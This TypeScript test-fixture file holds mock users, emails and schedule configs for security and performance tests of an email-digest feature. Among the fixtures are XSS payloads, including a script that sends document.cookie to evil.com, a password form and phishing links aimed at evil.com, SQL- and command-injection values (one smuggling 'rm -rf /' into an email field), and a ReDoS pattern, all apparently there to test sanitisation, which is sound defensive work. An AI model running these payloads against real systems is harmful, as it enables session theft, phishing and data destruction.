/**
 * Test fixtures and mock data for security and performance testing
 */

import { DigestConfig, DigestEmail, TeamMember } from "../types";

/**
 * Mock team members for testing
 */
export const mockTeamMembers = {
  valid: [
    {
      id: "user-1",
      email: "alice@example.com",
      name: "Alice Smith",
    },
    {
      id: "user-2",
      email: "bob@example.com",
      name: "Bob Johnson",
    },
    {
      id: "user-3",
      email: "charlie@example.com",
      name: "Charlie Brown",
    },
  ] as TeamMember[],

  malformed: {
    noEmail: {
      id: "user-1",
      name: "Alice Smith",
      // missing email
    },
    invalidEmail: {
      id: "user-1",
      email: "not-an-email",
      name: "Alice Smith",
    },
    emptyName: {
      id: "user-1",
      email: "alice@example.com",
      name: "",
    },
    tooLongName: {
      id: "user-1",
      email: "alice@example.com",
      name: "a".repeat(300),
    },
    controlCharactersInName: {
      id: "user-1",
      email: "alice@example.com",
      name: "Alice\x00Smith\x1F\x7F",
    },
  },

  xssAttempts: {
    nameWithScript: {
      id: "user-1",
      email: "alice@example.com",
      name: '<script>alert("xss")</script>',
    },
    nameWithHtmlTags: {
      id: "user-1",
      email: "alice@example.com",
      name: '<img src=x onerror="alert(1)">',
    },
    emailWithJavascript: {
      id: "user-1",
      email: "javascript:alert(1)@example.com",
      name: "Attacker",
    },
  },

  injectionAttempts: {
    sqlInjection: {
      id: "user-1",
      email: "admin'--@example.com",
      name: "Alice",
    },
    commandInjection: {
      id: "user-1",
      email: "alice@example.com; rm -rf /@example.com",
      name: "Alice",
    },
  },
};

/**
 * Mock emails for testing
 */
export const mockEmails = {
  benign: [
    {
      id: "email-1",
      from: "sender@example.com",
      to: ["recipient@example.com"],
      subject: "Team Meeting Tomorrow",
      snippet: "Let's discuss the Q3 roadmap.",
      timestamp: new Date("2024-06-15T10:00:00Z"),
      importance: 5,
      hasAttachments: false,
    } as DigestEmail,
    {
      id: "email-2",
      from: "project@example.com",
      to: ["team@example.com"],
      subject: "Release 2.0 scheduled",
      snippet: "We are planning to release version 2.0 next Monday.",
      timestamp: new Date("2024-06-15T11:00:00Z"),
      importance: 8,
      hasAttachments: true,
    } as DigestEmail,
  ],

  xssVectors: [
    {
      id: "email-xss-1",
      from: "attacker@example.com",
      to: ["victim@example.com"],
      subject: '<img src=x onerror="alert(1)">',
      snippet: "Click here: javascript:alert(1)",
      timestamp: new Date("2024-06-15T12:00:00Z"),
      importance: 1,
      hasAttachments: false,
    } as DigestEmail,
    {
      id: "email-xss-2",
      from: "attacker@example.com",
      to: ["victim@example.com"],
      subject: "Important",
      snippet: '<script>fetch("http://evil.com/steal?data=" + document.cookie)</script>',
      timestamp: new Date("2024-06-15T12:30:00Z"),
      importance: 1,
      hasAttachments: false,
    } as DigestEmail,
    {
      id: "email-xss-3",
      from: "attacker@example.com",
      to: ["victim@example.com"],
      subject: "Update",
      snippet: '<iframe src="http://evil.com/phishing"></iframe>',
      timestamp: new Date("2024-06-15T13:00:00Z"),
      importance: 1,
      hasAttachments: false,
    } as DigestEmail,
  ],

  htmlInjection: [
    {
      id: "email-html-1",
      from: "attacker@example.com",
      to: ["victim@example.com"],
      subject: "Important Update",
      snippet:
        '<form action="http://evil.com/steal"><input name="password" type="password"></form>',
      timestamp: new Date("2024-06-15T14:00:00Z"),
      importance: 1,
      hasAttachments: false,
    } as DigestEmail,
    {
      id: "email-html-2",
      from: "attacker@example.com",
      to: ["victim@example.com"],
      subject: "Verify Account",
      snippet:
        "<button onclick=\"location.href='http://evil.com/phishing'\">Click to verify</button>",
      timestamp: new Date("2024-06-15T14:30:00Z"),
      importance: 1,
      hasAttachments: false,
    } as DigestEmail,
  ],

  controlCharacters: [
    {
      id: "email-ctrl-1",
      from: "sender@example.com",
      to: ["recipient@example.com"],
      subject: "Normal\x00Subject\x1FWith\x7FControlChars",
      snippet: "This has control characters: \x00 \x1F \x7F \x9F",
      timestamp: new Date("2024-06-15T15:00:00Z"),
      importance: 1,
      hasAttachments: false,
    } as DigestEmail,
  ],

  largeContent: Array.from({ length: 1000 }, (_, i) => ({
    id: `email-large-${i}`,
    from: `sender${i % 10}@example.com`,
    to: ["recipient@example.com"],
    subject: `Email ${i}`,
    snippet: "a".repeat(5000), // 5KB snippet
    timestamp: new Date(Date.now() - i * 60000),
    importance: Math.random() * 10,
    hasAttachments: i % 10 === 0,
  })) as DigestEmail[],
};

/**
 * Mock digest configurations
 */
export const mockConfigs = {
  valid: {
    teamId: "team-1",
    recipients: mockTeamMembers.valid,
    schedule: {
      type: "daily" as const,
      value: "09:00",
      timezone: "America/New_York",
    },
    filters: {
      excludeSenders: [],
      excludeCategories: [],
    },
  } as unknown as DigestConfig,

  malformed: {
    noTeamId: {
      // Missing teamId
      recipients: mockTeamMembers.valid,
      schedule: {
        type: "daily" as const,
        value: "09:00",
      },
    },
    noRecipients: {
      teamId: "team-1",
      recipients: [],
      schedule: {
        type: "daily" as const,
        value: "09:00",
      },
    },
    tooManyRecipients: {
      teamId: "team-1",
      recipients: Array.from({ length: 1001 }, (_, i) => ({
        id: `user-${i}`,
        email: `user${i}@example.com`,
        name: `User ${i}`,
      })) as TeamMember[],
      schedule: {
        type: "daily" as const,
        value: "09:00",
      },
    },
    duplicateRecipients: {
      teamId: "team-1",
      recipients: [
        { id: "user-1", email: "alice@example.com", name: "Alice" },
        { id: "user-2", email: "alice@example.com", name: "Alice Copy" },
      ],
      schedule: {
        type: "daily" as const,
        value: "09:00",
      },
    },
    invalidSchedule: {
      teamId: "team-1",
      recipients: mockTeamMembers.valid,
      schedule: {
        type: "daily" as const,
        value: "25:00", // Invalid hour
      },
    },
    tooManyExclusions: {
      teamId: "team-1",
      recipients: mockTeamMembers.valid,
      schedule: {
        type: "daily" as const,
        value: "09:00",
      },
      filters: {
        excludeSenders: Array.from({ length: 1001 }, (_, i) => `user${i}@example.com`),
      },
    },
  },

  injectionAttempts: {
    cronReDoSAttempt: {
      teamId: "team-1",
      recipients: mockTeamMembers.valid,
      schedule: {
        type: "cron" as const,
        value: "(a+)+b".repeat(100), // ReDoS pattern
      },
    },
    complexCron: {
      teamId: "team-1",
      recipients: mockTeamMembers.valid,
      schedule: {
        type: "cron" as const,
        value: "0/30 0-23/2 1-31 1-12 0-6",
      },
    },
  },
};

/**
 * Test scenarios for performance
 */
export const performanceScenarios = {
  smallDigest: {
    emailCount: 100,
    recipientCount: 5,
    description: "Small digest: 100 emails, 5 recipients",
  },
  mediumDigest: {
    emailCount: 1000,
    recipientCount: 50,
    description: "Medium digest: 1000 emails, 50 recipients",
  },
  largeDigest: {
    emailCount: 10000,
    recipientCount: 100,
    description: "Large digest: 10000 emails, 100 recipients",
  },
  maxRecipients: {
    emailCount: 5000,
    recipientCount: 1000,
    description: "Max recipients: 5000 emails, 1000 recipients",
  },
};

/**
 * Generate mock emails for performance testing
 */
export function generateMockEmails(count: number): DigestEmail[] {
  return Array.from({ length: count }, (_, i) => ({
    id: `email-${i}`,
    from: `sender${i % 100}@example.com`,
    to: [`recipient${i % 50}@example.com`],
    subject: `Subject ${i}`,
    snippet: `This is email ${i} with some content`.repeat(10),
    timestamp: new Date(Date.now() - i * 60000),
    importance: Math.random() * 10,
    hasAttachments: i % 20 === 0,
  }));
}

/**
 * Generate large HTML content for sanitization testing
 */
export function generateLargeHtml(sizeBytes: number): string {
  const chunk = "<p>This is a paragraph with some content.</p>\n";
  const chunkSize = chunk.length;
  const repetitions = Math.ceil(sizeBytes / chunkSize);

  return chunk.repeat(repetitions).substring(0, sizeBytes);
}

/**
 * Generate large HTML with XSS attempts
 */
export function generateLargeHtmlWithXSS(sizeBytes: number): string {
  const xssChunk = '<p>Content</p><script>alert("xss")</script><img src=x onerror="alert(1)">\n';
  const chunkSize = xssChunk.length;
  const repetitions = Math.ceil(sizeBytes / chunkSize);

  return xssChunk.repeat(repetitions).substring(0, sizeBytes);
}
